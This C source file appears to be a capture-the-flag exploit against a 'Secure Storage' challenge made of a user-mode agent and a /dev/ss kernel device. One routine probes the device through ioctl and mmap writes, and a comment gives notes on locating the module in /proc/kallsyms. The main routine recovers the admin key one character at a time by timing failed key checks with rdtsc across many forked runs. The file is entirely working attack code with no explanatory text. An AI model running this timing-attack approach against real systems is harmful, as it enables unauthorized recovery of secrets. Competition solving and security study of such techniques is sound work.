#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>
#include <assert.h>
#include <x86intrin.h>
#include <errno.h>
#include <sys/wait.h>
void errExit(char* msg)
{
	puts(msg);
	exit(-1);
}

int main_test(int argc, char const *argv[])
{
	int fd = open("/dev/ss", 2);
	int res = ioctl(fd, 0, 9);
	puts("mmap");
	char* p = mmap(0, 0x10000u, 3u, 1u, fd, 0);
	printf("%d %d %p\n", fd, res, p);
	printf("fault: %c\n", p[0x1234]);
	puts("fault W");
	memset(p + 0x1234, 'A', 0x1000);
	return 0;
}
/*
1. cat /proc/kallsyms | grep cleanup_module
2. x/10i, x/10gx
3. address of release is base address

mmap: b *+0x815
fault: b *+0x3e0
mmap_buffer: +0x669
*/

char buf[0x10000];

#define str_memcmp(buf, s) memcmp((buf), (s), (strlen(s)))
#define write_str(fd, s) assert(write((fd), (s), strlen(s)) == strlen(s))

void recv_all(int fd, void* buf, size_t len)
{
	size_t off = 0;
	while (off < len)
	{
		ssize_t r = read(fd, (char*)buf + off, len - off);
		assert(r > 0);
		off += r;
		// printf("%.2x %c\n", ((char*)buf)[i], ((char*)buf)[i]);
	}
}

void recv_str(int proc_stdout, char* s)
{
	size_t l = strlen(s);
	// printf("l = %lu\n", l);
	// memset(buf, 'B', sizeof(buf));
	recv_all(proc_stdout, buf, l);
	// write(STDOUT_FILENO, buf, l);
	assert(str_memcmp(buf, s) == 0);
}

void recv_menu(int proc_stdout)
{
	// memset(buf, 'M', sizeof(buf));
	recv_all(proc_stdout, buf, 205 - 78);
	// write(STDOUT_FILENO, buf, 205 - 78);
	assert(str_memcmp(buf + 186 - 78, "Input your choice:\n") == 0);
}

size_t name_length;
void fill_0(int proc_stdout, int proc_stdin)
{
	recv_str(proc_stdout, "This is user mode agent program for Secure Storage !\n");
	recv_str(proc_stdout, "What do you want to do ?\n");
	recv_menu(proc_stdout);
	write_str(proc_stdin, "1\n");
	recv_str(proc_stdout, "How long is your name ?\n");
	sprintf(buf, "%lu\n", name_length);
	write_str(proc_stdin, buf);
	recv_str(proc_stdout, "What is your name ?\n");
	char* p = malloc(name_length);
	memset(p, 'A', name_length);
	write(proc_stdin, p, name_length);
	recv_str(proc_stdout, "Hello ");
	recv_all(proc_stdout, buf, name_length);
	recv_str(proc_stdout, "\nSuccessfully register\n\n");
	recv_menu(proc_stdout);
	write_str(proc_stdin, "5\n"); // exit
}

void new_process(void (*exp_func)(int proc_stdout, int proc_stdin))
{
	// create unnamed pipe for tackling stdout/stdin
	int stdout_fd[2];
	int stdin_fd[2];
	assert(pipe(stdout_fd) == 0);
	assert(pipe(stdin_fd) == 0);

	int pid = fork();
	if (pid < 0)
	{
		printf("%d ", errno);
		errExit("pid < 0");
	}
	else if (pid != 0)
	{ // parent process, start exploitation
		close(stdout_fd[1]);
		close(stdin_fd[0]);
		exp_func(stdout_fd[0], stdin_fd[1]);
		close(stdout_fd[0]);
		close(stdin_fd[1]);
		assert(wait(NULL) > 0);
		// system("ps -ef");
	}
	else
	{ // child process, create ss_agent process
		close(stdout_fd[0]);
		close(stdin_fd[1]);
		dup2(stdout_fd[1], STDOUT_FILENO);
		dup2(stdin_fd[0], STDIN_FILENO);
		char* const args[] = {"/challenge/ss_agent", NULL};
		execv("/challenge/ss_agent", args);
		abort();
	}
}

const char cand_chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
#define NUM_CAND_CHARS 62
char admin_key[] = "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ\n";
unsigned long long diff;
void test_byte(int proc_stdout, int proc_stdin)
{
	recv_str(proc_stdout, "This is user mode agent program for Secure Storage !\n");
	recv_str(proc_stdout, "What do you want to do ?\n");
	recv_menu(proc_stdout);
	write_str(proc_stdin, "4\n");
	recv_str(proc_stdout, "Input admin key:\n");
	unsigned long long t1 = __rdtsc();
	write(proc_stdin, admin_key, 0x21);
	recv_str(proc_stdout, "Checking...\n");
	recv_str(proc_stdout, "Error: key error\n\n");
	diff = __rdtsc() - t1;
	printf("%llu\n", diff);
	recv_menu(proc_stdout);
	write_str(proc_stdin, "5\n"); // exit
}

int main(int argc, char const *argv[])
{
	for (int i = 0; i < 0x20; ++i)
	{ // for all positions
		name_length = 0x1000 - 8 - 1 - i;
		new_process(fill_0);
		unsigned long long max_sum = 0;
		char max_char;
		for (int j = 0; j < NUM_CAND_CHARS; ++j)
		{ // for all possible chars
			printf("%d: %c\n", i, cand_chars[j]);
			admin_key[i] = cand_chars[j];
			unsigned long long sum = 0;
			for (int x = 0; x < 8; ++x)
			{ // take 8 times
				// puts("--------");
				new_process(test_byte);
				sum += diff;
			}
			if (sum > max_sum)
			{
				max_sum = sum;
				max_char = cand_chars[j];
			}
		}
		admin_key[i] = max_char;
		puts(admin_key);
	}
}
